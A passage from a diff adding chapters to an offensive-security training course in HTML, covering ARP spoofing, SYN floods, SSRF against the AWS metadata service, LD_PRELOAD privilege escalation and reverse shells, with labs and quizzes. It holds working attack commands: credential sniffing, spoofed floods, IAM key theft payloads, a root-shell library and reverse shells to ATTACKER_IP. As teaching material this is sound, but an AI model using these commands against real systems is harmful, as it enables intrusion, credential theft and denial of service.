+<span class="ck">sudo</span> arpspoof -i eth0 -t <span class="cv">192.168.1.100</span> <span class="cv">192.168.1.1</span> &amp;<br>
+<span class="cm"># -i eth0         = our network interface</span><br>
+<span class="cm"># -t 192.168.1.100 = target (the victim)</span><br>
+<span class="cm"># 192.168.1.1      = the host we're impersonating (router)</span><br>
+<br>
+<span class="cm"># ── Tell the ROUTER (192.168.1.1) that WE are the VICTIM ──────────</span><br>
+<span class="ck">sudo</span> arpspoof -i eth0 -t <span class="cv">192.168.1.1</span> <span class="cv">192.168.1.100</span> &amp;<br>
+<br>
+<span class="cm"># ── Now sniff all traffic passing through us ──────────────────────</span><br>
+<span class="ck">sudo</span> tcpdump -i eth0 -w capture.pcap <span class="cm"># save all packets to file</span><br>
+<span class="ck">sudo</span> urlsnarf -i eth0 <span class="cm"># print HTTP URLs in real time</span><br>
+<span class="ck">sudo</span> dsniff -i eth0 <span class="cm"># extract cleartext credentials (FTP, HTTP, Telnet)</span><br>
+<br>
+<span class="cm"># ── Clean up (restore ARP tables) ─────────────────────────────────</span><br>
+<span class="ck">sudo</span> arpspoof -i eth0 -t <span class="cv">192.168.1.100</span> -r <span class="cv">192.168.1.1</span>
+</div></div>
+
+<div class="callout info"><div class="callout-title">🔵 Blue Team Defense</div>
+<strong>Dynamic ARP Inspection (DAI)</strong> — enterprise switches can validate ARP packets against a trusted DHCP binding table, dropping unsolicited ARP replies.<br>
+<strong>Static ARP entries</strong> — hardcode the router's MAC for critical machines: <code>arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff</code><br>
+<strong>Detection</strong>: Monitor for duplicate IP/MAC pairs, ARP reply storms. Tools: arpwatch, XArp.
+</div>
+
+<div class="sec"><h2>Layer 4 Attack: SYN Flood (DoS)</h2></div>
+<p>TCP requires a 3-way handshake before any communication. A SYN flood exploits this by sending thousands of SYN packets with <strong>spoofed source IPs</strong> — the server allocates resources for each half-open connection, exhausting its connection table.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Lab VM Only</span></div>
+<div class="code-body">
+<span class="cm"># ── hping3 SYN flood — Lab environment ONLY ───────────────────────</span><br>
+<span class="ck">sudo</span> hping3 -S --flood -V -p <span class="cv">80</span> <span class="cv">192.168.1.200</span><br>
+<span class="cm"># -S       = set SYN flag (start handshake, never complete it)</span><br>
+<span class="cm"># --flood  = send as fast as possible (no inter-packet delay)</span><br>
+<span class="cm"># -V       = verbose — show packet count</span><br>
+<span class="cm"># -p 80    = target port 80 (HTTP)</span><br>
+<br>
+<span class="cm"># ── With random spoofed source IPs (harder to block) ──────────────</span><br>
+<span class="ck">sudo</span> hping3 -S --flood --rand-source -p <span class="cv">80</span> <span class="cv">192.168.1.200</span><br>
+<span class="cm"># --rand-source = randomise source IP per packet (bypass IP-based blocks)</span><br>
+<br>
+<span class="cm"># ── Watch the effect on the target ────────────────────────────────</span><br>
+<span class="cm"># On target machine:</span><br>
+<span class="ck">ss</span> -s <span class="cm"># see TCP socket statistics — SYN_RECV count explodes</span><br>
+<span class="ck">netstat</span> -tn <span class="cm"># watch half-open connections fill up</span>
+</div></div>
+
+<div class="sec"><h2>Layer 3 Attack: SSRF via AWS Metadata</h2></div>
+<p>When an application fetches URLs on behalf of users, an attacker can redirect those requests to <strong>internal network addresses</strong> — including the AWS EC2 metadata service at <span class="ic">169.254.169.254</span>, which exposes IAM credentials with zero authentication.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">SSRF Attack — PortSwigger Lab</span></div>
+<div class="code-body">
+<span class="cm"># Target app has a parameter that fetches a URL:</span><br>
+<span class="cm"># POST /product/stock HTTP/1.1</span><br>
+<span class="cm"># stockApi=https://stock.weliketoshop.net/...</span><br>
+<br>
+<span class="cm"># ── Step 1: Replace with AWS metadata endpoint ────────────────────</span><br>
+stockApi=<span class="cs">http://169.254.169.254/latest/meta-data/</span><br>
+<span class="cm"># Response reveals the metadata directory listing</span><br>
+<br>
+<span class="cm"># ── Step 2: Dig deeper for IAM credentials ────────────────────────</span><br>
+stockApi=<span class="cs">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span><br>
+<span class="cm"># Response: "ec2-production-role"  ← the IAM role name</span><br>
+<br>
+<span class="cm"># ── Step 3: Extract the actual AWS keys ───────────────────────────</span><br>
+stockApi=<span class="cs">http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role</span><br>
+<span class="cm"># Response:</span><br>
+<span class="cs">{</span><br>
+<span class="cs">  "AccessKeyId": "ASIA...",</span><br>
+<span class="cs">  "SecretAccessKey": "wJalrXUt...",</span><br>
+<span class="cs">  "Token": "AQoXnyc..."</span><br>
+<span class="cs">}</span><br>
+<span class="cm"># These keys grant attacker AWS console access with EC2 role permissions</span>
+</div></div>
+
+<div class="lab">
+  <div class="lab-header">🧪 Hands-On Lab</div>
+  <div class="lab-title">ARP Poisoning on Your Local VM Network</div>
+  <ol>
+    <li>Set up two VMs in VirtualBox — Kali (attacker) and an Ubuntu VM (victim)</li>
+    <li>Set both to Host-Only networking so they share an internal subnet</li>
+    <li>On Kali, run <span class="ic">arp -a</span> to see the current ARP table</li>
+    <li>Start arpspoof between the two VMs</li>
+    <li>On the Ubuntu VM, run <span class="ic">arp -a</span> again — notice the MAC address has changed</li>
+    <li>On Kali, run <span class="ic">tcpdump -i eth0 -n</span> — you should see Ubuntu's traffic</li>
+    <li>Restore the ARP tables and verify normal traffic resumes</li>
+  </ol>
+</div>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 01</div>
+  <div class="quiz-q">Q1: An attacker captures a WPA2 handshake and runs hashcat against it. Which OSI layer is this attack targeting?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">Layer 2 (Data Link). WPA2 operates at L2 to authenticate devices to the wireless network. The 4-way handshake happens before any IP traffic flows. Hashcat then cracks the Pre-Shared Key offline — the attacker never needs to stay on-site.</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: Why does ARP poisoning work even on switched networks?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">ARP has no authentication. Switches forward frames based on MAC tables, but ARP responses are trusted blindly — any device can claim any IP. Switches learn MACs from frames, so when poisoned ARP replies update the victim's cache, the switch's MAC table also gets updated via the new traffic flow.</div>
+</div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch00')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 00 — Overview</div></div>
+  <div class="nav-btn next" onclick="show('ch02')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 02 — TCP/IP & Ports</div></div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 02 ═══════════════ -->
+<div class="chapter" id="ch02">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 02 — TCP/IP, Ports & Protocols</h1>
+  <p class="ch-sub">3-Way Handshake · TCP Flags · All Critical Ports · CIDR · Subnetting</p>
+</div>
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Port scanners, packet crafting tools, network exploitation — all depend on understanding how TCP/UDP sessions are established, maintained, and terminated.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">TCP is a stateful, reliable, connection-oriented protocol. UDP is stateless and connectionless. Both are L4 transport protocols that multiplex application data using port numbers.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">Every network connection your browser makes is TCP. Every DNS query is UDP. Every port scan sends crafted TCP/UDP packets. This is the heartbeat of networking.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">During reconnaissance (port scanning), exploitation (connecting to shells), and post-exploitation (pivoting). Also when evading firewalls — UDP often bypasses rules meant for TCP.</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Every hacker and defender. Without TCP/IP internals, you can't understand Nmap output, interpret Wireshark captures, or design network-level attacks.</div></div>
+</div>
+
+<div class="sec"><h2>The TCP 3-Way Handshake — Full Internals</h2></div>
+<p>Before any data flows over TCP, a connection must be established. This takes exactly 3 packets. Each packet contains <strong>TCP flags</strong> — single-bit fields in the TCP header that control connection state.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">TCP State Machine</span></div>
+<div class="code-body">
+<span class="co">CLIENT</span>                              <span class="co">SERVER</span><br>
+<span class="cm">  │                                     │</span><br>
+<span class="cm">  │──── SYN (seq=1000) ────────────────►│</span>  <span class="cv">SYN_RECEIVED</span><br>
+<span class="cm">  │     "I want to connect"             │</span><br>
+<span class="cm">  │     Client picks random ISN=1000    │</span><br>
+<span class="cm">  │                                     │</span><br>
+<span class="cm">  │◄─── SYN-ACK (seq=5000, ack=1001) ──│</span>  <span class="cv">SYN_RECEIVED</span><br>
+<span class="cm">  │     "OK, I'll connect. ISN=5000"    │</span><br>
+<span class="cm">  │     ack=1001 confirms your SYN      │</span><br>
+<span class="cm">  │                                     │</span><br>
+<span class="cm">  │──── ACK (ack=5001) ────────────────►│</span>  <span class="cv">ESTABLISHED</span><br>
+<span class="cm">  │     "Got it. Connection open."      │</span><br>
+<span class="cm">  │                                     │</span><br>
+<span class="co">  ★ CONNECTION ESTABLISHED — data flows ★</span><br>
+<br>
+<span class="cm"># KEY INSIGHT FOR ATTACKERS:</span><br>
+<span class="cm"># SYN scans (nmap -sS) send SYN, wait for SYN-ACK, then RST</span><br>
+<span class="cm"># Never complete the handshake = no connection logged in many systems</span><br>
+<span class="cm"># ISN (Initial Sequence Number) randomisation prevents prediction attacks</span>
+</div></div>
+
+<div class="sec"><h2>All TCP Flags — Hacking Relevance</h2></div>
+<table class="tbl">
+<tr><th>Flag</th><th>Name</th><th>Bit</th><th>Hacker Use</th></tr>
+<tr><td><span class="ic">SYN</span></td><td>Synchronise</td><td>0x02</td><td>Port scanning (nmap -sS), SYN flood DoS, session initiation</td></tr>
+<tr><td><span class="ic">ACK</span></td><td>Acknowledge</td><td>0x10</td><td>ACK scan to bypass stateless firewalls (nmap -sA), confirms receipt</td></tr>
+<tr><td><span class="ic">FIN</span></td><td>Finish</td><td>0x01</td><td>FIN scan for stealth (nmap -sF) — some systems don't log FIN</td></tr>
+<tr><td><span class="ic">RST</span></td><td>Reset</td><td>0x04</td><td>Abrupt connection termination, port closed response, TCP hijacking</td></tr>
+<tr><td><span class="ic">PSH</span></td><td>Push</td><td>0x08</td><td>Forces immediate delivery to app layer — seen in interactive shells</td></tr>
+<tr><td><span class="ic">URG</span></td><td>Urgent</td><td>0x20</td><td>Urgent data pointer — rarely used, sometimes used in evasion</td></tr>
+<tr><td><span class="ic">NULL</span></td><td>No flags</td><td>0x00</td><td>NULL scan (nmap -sN) — RFC says closed ports must RST, others ignore</td></tr>
+<tr><td><span class="ic">XMAS</span></td><td>FIN+PSH+URG</td><td>0x29</td><td>XMAS scan (nmap -sX) — "lights up like a Christmas tree"</td></tr>
+</table>
+
+<div class="sec"><h2>Critical Ports — Every Hacker's Reference</h2></div>
+<table class="tbl">
+<tr><th>Port</th><th>Protocol</th><th>Service</th><th>Attack Angle</th></tr>
+<tr><td>21</td><td>TCP</td><td>FTP</td><td>Anonymous login, cleartext creds, bounce attack, command injection</td></tr>
+<tr><td>22</td><td>TCP</td><td>SSH</td><td>Brute force, weak keys, public key auth bypass, user enumeration</td></tr>
+<tr><td>23</td><td>TCP</td><td>Telnet</td><td>Cleartext — sniff credentials. Outdated but still found on IoT</td></tr>
+<tr><td>25</td><td>TCP</td><td>SMTP</td><td>Open relay, user enumeration (VRFY/EXPN), email spoofing</td></tr>
+<tr><td>53</td><td>UDP/TCP</td><td>DNS</td><td>Zone transfer (AXFR), cache poisoning, DNS tunnelling, amplification DoS</td></tr>
+<tr><td>80</td><td>TCP</td><td>HTTP</td><td>All web attacks — SQLi, XSS, SSRF, LFI, RFI, IDOR</td></tr>
+<tr><td>139/445</td><td>TCP</td><td>SMB</td><td>EternalBlue (MS17-010), pass-the-hash, relay attacks, ransomware</td></tr>
+<tr><td>443</td><td>TCP</td><td>HTTPS</td><td>Same as 80 but encrypted — SSL cert issues, BEAST, POODLE</td></tr>
+<tr><td>3306</td><td>TCP</td><td>MySQL</td><td>Exposed DB, brute force, UDF privilege escalation</td></tr>
+<tr><td>3389</td><td>TCP</td><td>RDP</td><td>BlueKeep (CVE-2019-0708), credential stuffing, MitM</td></tr>
+<tr><td>4444</td><td>TCP</td><td>Metasploit</td><td>Default Meterpreter listener — flag in traffic = active compromise</td></tr>
+<tr><td>8080/8443</td><td>TCP</td><td>HTTP-alt</td><td>Dev servers, admin panels, Jenkins, Tomcat default deployments</td></tr>
+</table>
+
+<div class="sec"><h2>TCP vs UDP — Attacker's Comparison</h2></div>
+<table class="tbl">
+<tr><th>Property</th><th>TCP</th><th>UDP</th></tr>
+<tr><td>Connection</td><td>Stateful — 3-way handshake</td><td>Stateless — no handshake</td></tr>
+<tr><td>Reliability</td><td>Guaranteed — retransmits lost packets</td><td>Best effort — no retransmit</td></tr>
+<tr><td>Speed</td><td>Slower (overhead of state management)</td><td>Faster (no overhead)</td></tr>
+<tr><td>Hacker use</td><td>Port scanning, shells, web traffic</td><td>DNS tunnelling, UDP flood, VoIP hijacking</td></tr>
+<tr><td>Firewall evasion</td><td>Stateful firewalls track TCP state</td><td>UDP often less scrutinised</td></tr>
+<tr><td>DoS</td><td>SYN flood, ACK flood</td><td>UDP flood, amplification (DNS, NTP, SSDP)</td></tr>
+</table>
+
+<div class="sec"><h2>CIDR Notation & Subnet Math</h2></div>
+<p>CIDR (Classless Inter-Domain Routing) notation uses a slash followed by the number of network bits. Understanding subnets is critical for identifying live hosts during recon and for pivoting between network segments.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Subnet Reference</span></div>
+<div class="code-body">
+<span class="cm"># CIDR Cheat Sheet</span><br>
+<span class="co">/32</span>  → <span class="cs">1 host</span>    (single IP — used in firewall rules)<br>
+<span class="co">/31</span>  → <span class="cs">2 hosts</span>   (point-to-point links)<br>
+<span class="co">/30</span>  → <span class="cs">2 usable</span>  (4 total — small segments)<br>
+<span class="co">/29</span>  → <span class="cs">6 usable</span>  (8 total)<br>
+<span class="co">/28</span>  → <span class="cs">14 usable</span> (16 total)<br>
+<span class="co">/27</span>  → <span class="cs">30 usable</span> (32 total)<br>
+<span class="co">/24</span>  → <span class="cs">254 usable</span> (256 total — most common LAN: 192.168.1.0/24)<br>
+<span class="co">/16</span>  → <span class="cs">65534 usable</span> (65536 total — 10.0.0.0/16)<br>
+<span class="co">/8</span>   → <span class="cs">16,777,214 usable</span> (Class A — 10.0.0.0/8)<br>
+<br>
+<span class="cm"># Private IP Ranges (RFC 1918) — common in internal networks</span><br>
+<span class="cv">10.0.0.0/8</span>      <span class="cm"># 10.x.x.x — large corporate networks</span><br>
+<span class="cv">172.16.0.0/12</span>   <span class="cm"># 172.16.x.x – 172.31.x.x</span><br>
+<span class="cv">192.168.0.0/16</span>  <span class="cm"># 192.168.x.x — home/small office (most common)</span><br>
+<br>
+<span class="cm"># During a pentest — scan the whole subnet at once:</span><br>
+<span class="ck">nmap</span> -sn <span class="cv">192.168.1.0/24</span>  <span class="cm"># ping sweep — find all live hosts</span><br>
+<span class="ck">nmap</span> -sn <span class="cv">10.0.0.0/8</span>      <span class="cm"># WARNING: this is 16 million IPs — use /24 slices</span>
+</div></div>
+
+<div class="lab">
+  <div class="lab-header">🧪 Hands-On Lab</div>
+  <div class="lab-title">TCP Handshake Analysis with Wireshark</div>
+  <ol>
+    <li>Open Wireshark on Kali, select your network interface, start capture</li>
+    <li>Open a terminal and run: <span class="ic">curl http://httpbin.org/get</span></li>
+    <li>Stop the capture and apply filter: <span class="ic">tcp.flags.syn == 1</span></li>
+    <li>Find the SYN packet — note the sequence number (ISN)</li>
+    <li>Find the SYN-ACK — confirm ack = ISN + 1</li>
+    <li>Find the ACK — connection established</li>
+    <li>Now filter: <span class="ic">tcp.flags.fin == 1</span> — observe the 4-way teardown</li>
+    <li>Try <span class="ic">nmap -sS 127.0.0.1</span> and see how SYN scans look in Wireshark</li>
+  </ol>
+</div>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 02</div>
+  <div class="quiz-q">Q1: Why does Nmap's -sS (SYN scan) require root/sudo privileges?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">SYN scanning requires crafting raw packets with specific TCP flags — specifically sending a RST instead of completing the handshake. Raw socket access on Linux requires root/CAP_NET_RAW capability. Without it, the OS handles the socket and automatically completes the handshake (creating a full TCP connect scan instead).</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: Port 4444 appears in your Wireshark capture connecting outbound from a server to an external IP. What does this likely indicate?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">Very likely a Metasploit Meterpreter reverse shell. Port 4444 is the default listener for Metasploit payloads. The server was probably compromised and is calling back to the attacker's machine. Immediate incident response: isolate the machine, capture memory dump, check /proc/[pid]/exe and netstat for the process making the connection.</div>
+</div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch01')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 01 — OSI Model</div></div>
+  <div class="nav-btn next" onclick="show('ch03')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 03 — Linux Architecture</div></div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 03 ═══════════════ -->
+<div class="chapter" id="ch03">
+<div class="ch-header">
+  <span class="ch-phase ph1">Phase 1 — Foundations</span>
+  <h1 class="ch-title">Chapter 03 — Linux Architecture</h1>
+  <p class="ch-sub">Kernel · Syscalls · Ring 0/3 · execve() · LD_PRELOAD · Reverse Shell Intro</p>
+</div>
+<div class="fiveq">
+  <div class="q-card"><div class="q-letter">WHY</div><div class="q-label">Purpose</div><div class="q-text">Most servers run Linux. Understanding its internal architecture is what separates a script kiddie from a real hacker. Knowing where privilege lives lets you escalate it.</div></div>
+  <div class="q-card"><div class="q-letter">WHAT</div><div class="q-label">Internals</div><div class="q-text">Linux is a monolithic kernel surrounded by layers: syscall interface, glibc, shell, userspace applications. Each layer has different privilege levels enforced by CPU hardware.</div></div>
+  <div class="q-card"><div class="q-letter">WHERE</div><div class="q-label">Context</div><div class="q-text">Every command you run in a terminal, every web server process, every SUID binary — all interact with the kernel through this architecture. PrivEsc is about crossing the Ring 0/3 boundary.</div></div>
+  <div class="q-card"><div class="q-letter">WHEN</div><div class="q-label">Timing</div><div class="q-text">During privilege escalation (kernel exploits, LD_PRELOAD), during malware analysis (strace reveals syscalls), during CTF binary challenges (understanding execve chains).</div></div>
+  <div class="q-card"><div class="q-letter">WHO</div><div class="q-label">Audience</div><div class="q-text">Pentesters (PrivEsc chains), malware analysts (understanding rootkits), CTF players (binary exploitation). Everyone who touches a Linux system professionally.</div></div>
+</div>
+
+<div class="sec"><h2>The Linux Layer Model</h2></div>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">Architecture</span></div>
+<div class="code-body">
+<span class="cm">┌─────────────────────────────────────────────────────────────┐</span><br>
+<span class="co">│  USER APPLICATIONS  </span><span class="cw">bash, nginx, python, curl, etc.</span><span class="co">          │</span> <span class="cv">Ring 3</span><br>
+<span class="cm">├─────────────────────────────────────────────────────────────┤</span><br>
+<span class="co">│  C STANDARD LIBRARY </span><span class="cw">glibc — wraps syscalls in friendly API  </span><span class="co">│</span> <span class="cv">Ring 3</span><br>
+<span class="cm">│                     </span><span class="cw">printf() → write() → sys_write()        </span><span class="cm">│</span><br>
+<span class="cm">├─────────────────────────────────────────────────────────────┤</span><br>
+<span class="cn">│  SYSCALL INTERFACE  </span><span class="cw">int 0x80 / syscall instruction           </span><span class="cn">│</span> <span class="cv">← PRIVILEGE BOUNDARY</span><br>
+<span class="cm">├─────────────────────────────────────────────────────────────┤</span><br>
+<span class="cs">│  LINUX KERNEL       </span><span class="cw">process mgmt, memory, I/O, networking    </span><span class="cs">│</span> <span class="cv">Ring 0</span><br>
+<span class="cm">├─────────────────────────────────────────────────────────────┤</span><br>
+<span class="cs">│  HARDWARE           </span><span class="cw">CPU, RAM, NIC, Disk                      </span><span class="cs">│</span> <span class="cv">Ring 0</span><br>
+<span class="cm">└─────────────────────────────────────────────────────────────┘</span><br>
+<br>
+<span class="cm"># Ring 0 = kernel mode — unlimited hardware access</span><br>
+<span class="cm"># Ring 3 = user mode — restricted — must ask kernel for everything</span><br>
+<span class="cm"># Crossing from Ring 3 to Ring 0 = syscall (controlled)</span><br>
+<span class="cm"># Exploiting a kernel bug = crossing that boundary UNCONTROLLED = root</span>
+</div></div>
+
+<div class="sec"><h2>Syscalls — The Kernel's API</h2></div>
+<p>Every privileged action a program takes — reading a file, creating a socket, spawning a process — goes through a <strong>system call</strong>. The program puts arguments in registers, puts the syscall number in <span class="ic">rax</span>, and executes the <span class="ic">syscall</span> instruction. The CPU switches to kernel mode for the duration.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — strace to see every syscall</span></div>
+<div class="code-body">
+<span class="cm"># strace shows EVERY system call a process makes — gold for analysis</span><br>
+<span class="ck">strace</span> ls <span class="cm"># trace the ls command</span><br>
+<span class="cm"># Output sample:</span><br>
+<span class="cv">execve</span>("/usr/bin/ls", ["ls"], envp) = 0       <span class="cm"># exec the ls binary</span><br>
+<span class="cv">openat</span>(AT_FDCWD, ".", O_RDONLY|O_DIRECTORY) = 3 <span class="cm"># open current dir</span><br>
+<span class="cv">getdents64</span>(3, ..., 32768) = 320               <span class="cm"># read directory entries</span><br>
+<span class="cv">write</span>(1, "file1  file2  dir1\n", 19)           <span class="cm"># write to stdout</span><br>
+<span class="cv">exit_group</span>(0)                                  <span class="cm"># clean exit</span><br>
+<br>
+<span class="cm"># Trace a specific process by PID (excellent for malware analysis)</span><br>
+<span class="ck">strace</span> -p <span class="cv">1337</span> -e trace=network  <span class="cm"># only show network syscalls</span><br>
+<span class="ck">strace</span> -p <span class="cv">1337</span> -e trace=file     <span class="cm"># only show file access</span><br>
+<span class="ck">strace</span> -p <span class="cv">1337</span> -o <span class="cv">output.txt</span>    <span class="cm"># save all syscalls to file</span><br>
+<br>
+<span class="cm"># During malware analysis — what files does the binary touch?</span><br>
+<span class="ck">strace</span> -e trace=open,openat,read,write ./suspicious_binary <span class="cv">2&gt;&amp;1</span> | grep -v ENOENT
+</div></div>
+
+<div class="sec"><h2>LD_PRELOAD Hijacking — Privilege Escalation</h2></div>
+<p><span class="ic">LD_PRELOAD</span> is an environment variable that tells the dynamic linker to load a specified shared library <strong>before all others</strong>. If you can control this variable when a SUID binary runs, you can inject your own code that executes as root.</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">C + bash — LD_PRELOAD Privesc (Lab)</span></div>
+<div class="code-body">
+<span class="cm"># Condition: sudo preserves LD_PRELOAD (env_keep += LD_PRELOAD in sudoers)</span><br>
+<span class="cm"># Check: sudo -l → look for "env_keep" or "SETENV"</span><br>
+<br>
+<span class="cm"># ── Step 1: Create the malicious shared library ───────────────────</span><br>
+<span class="ck">cat</span> &gt; /tmp/evil.c &lt;&lt;<span class="cs">'EOF'</span><br>
+<span class="cb">#include &lt;stdio.h&gt;</span><br>
+<span class="cb">#include &lt;stdlib.h&gt;</span><br>
+<span class="cb">#include &lt;unistd.h&gt;</span><br>
+<br>
+<span class="cm">// This function runs automatically when the library loads</span><br>
+<span class="ck">void</span> <span class="co">__attribute__</span>((constructor)) <span class="cv">init</span>() {<br>
+    <span class="cv">setuid</span>(0);   <span class="cm">// set UID to root</span><br>
+    <span class="cv">setgid</span>(0);   <span class="cm">// set GID to root</span><br>
+    <span class="cv">system</span>(<span class="cs">"/bin/bash -p"</span>); <span class="cm">// spawn root bash shell</span><br>
+}<br>
+<span class="cs">EOF</span><br>
+<br>
+<span class="cm"># ── Step 2: Compile as shared library ─────────────────────────────</span><br>
+<span class="ck">gcc</span> -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles<br>
+<span class="cm"># -fPIC    = position independent code (required for shared libs)</span><br>
+<span class="cm"># -shared  = create a .so instead of an executable</span><br>
+<span class="cm"># -nostartfiles = don't link standard startup code</span><br>
+<br>
+<span class="cm"># ── Step 3: Exploit — use sudo with LD_PRELOAD set ────────────────</span><br>
+<span class="ck">sudo</span> LD_PRELOAD=/tmp/evil.so <span class="cv">apache2</span>  <span class="cm"># can sudo apache2 with NOPASSWD</span><br>
+<span class="cm"># Library loads → init() runs first → setuid(0) → /bin/bash as root</span><br>
+<span class="cm"># Result: root shell</span>
+</div></div>
+
+<div class="sec"><h2>Reverse Shell Concept</h2></div>
+<p>A <strong>reverse shell</strong> is when the target machine connects <em>back</em> to the attacker. This bypasses firewalls that block inbound connections but allow outbound traffic (which is most firewalls).</p>
+
+<div class="code-block">
+<div class="code-bar"><div class="dot" style="background:#ff5f57"></div><div class="dot" style="background:#ffbd2e"></div><div class="dot" style="background:#28ca41"></div><span class="code-lang">bash — Reverse Shell (Authorised Lab Only)</span></div>
+<div class="code-body">
+<span class="cm"># ATTACKER MACHINE — set up listener first</span><br>
+<span class="ck">nc</span> -lvnp <span class="cv">4444</span><br>
+<span class="cm"># -l = listen mode</span><br>
+<span class="cm"># -v = verbose</span><br>
+<span class="cm"># -n = no DNS resolution</span><br>
+<span class="cm"># -p 4444 = listen on port 4444</span><br>
+<br>
+<span class="cm"># TARGET MACHINE — execute reverse shell (after gaining code exec)</span><br>
+<span class="ck">bash</span> -i &gt;&amp; /dev/tcp/<span class="cv">ATTACKER_IP</span>/<span class="cv">4444</span> 0&gt;&amp;1<br>
+<span class="cm"># bash -i      = interactive bash</span><br>
+<span class="cm"># /dev/tcp/IP/PORT = bash's built-in TCP connection</span><br>
+<span class="cm"># &gt;&amp;           = redirect stdout AND stderr to the TCP socket</span><br>
+<span class="cm"># 0&gt;&amp;1         = redirect stdin from stdout (the socket)</span><br>
+<br>
+<span class="cm"># Alternative — Python reverse shell (when bash not available)</span><br>
+<span class="ck">python3</span> -c <span class="cs">'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</span><br>
+<br>
+<span class="cm"># Upgrade to fully interactive shell (after connection established)</span><br>
+<span class="ck">python3</span> -c <span class="cs">'import pty;pty.spawn("/bin/bash")'</span>  <span class="cm"># upgrade to PTY</span><br>
+<span class="cm"># Then press: Ctrl+Z → stty raw -echo → fg → reset</span>
+</div></div>
+
+<div class="lab">
+  <div class="lab-header">🧪 Hands-On Lab</div>
+  <div class="lab-title">strace a Real Binary — Understand What /bin/ls Actually Does</div>
+  <ol>
+    <li>Run <span class="ic">strace ls 2>&1 | head -30</span> — look at the first 30 syscalls</li>
+    <li>Identify: which syscall executes the binary? (execve)</li>
+    <li>Which syscalls open files? What files does ls access before listing a directory?</li>
+    <li>Run <span class="ic">strace -c ls</span> — get a summary count of each syscall type</li>
+    <li>Try <span class="ic">strace curl https://example.com 2>&1 | grep -E "connect|socket|send"</span> — see network syscalls</li>
+    <li>Optional: compile the LD_PRELOAD example and test in your VM</li>
+  </ol>
+</div>
+
+<div class="quiz">
+  <div class="quiz-title">// Quiz — Chapter 03</div>
+  <div class="quiz-q">Q1: What is the privilege boundary between Ring 0 and Ring 3, and why do kernel exploits matter to hackers?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">Ring 3 (user mode) processes cannot directly access hardware or execute privileged instructions — they must ask the kernel via syscalls. The kernel enforces all security boundaries (file permissions, process isolation, network rules). A kernel exploit bypasses this boundary, executing code at Ring 0 with unlimited privilege — instant root on any Linux system regardless of file permissions or sudo configuration.</div>
+
+  <div class="quiz-q" style="margin-top:1rem">Q2: Why is a reverse shell preferred over a bind shell in most real engagements?</div>
+  <button class="quiz-btn" onclick="toggleQuiz(this)">Reveal Answer</button>
+  <div class="quiz-a">A bind shell opens a listening port on the target — the attacker connects in. Most corporate firewalls block inbound connections on arbitrary ports. A reverse shell has the target connect OUT to the attacker — outbound traffic (especially on ports 80, 443, or 53) is usually allowed through firewalls. This makes reverse shells far more reliable in real-world environments with proper perimeter firewalls.</div>
+</div>
+
+<div class="ch-nav">
+  <div class="nav-btn" onclick="show('ch02')"><div class="nav-dir">← Previous</div><div class="nav-name">Ch 02 — TCP/IP & Ports</div></div>
+  <div class="nav-btn next" onclick="show('ch04')"><div class="nav-dir">Next →</div><div class="nav-name">Ch 04 — Linux Filesystem</div></div>
+</div>
+</div>
+
+<!-- ═══════════════ CH 04 ═══════════════ -->
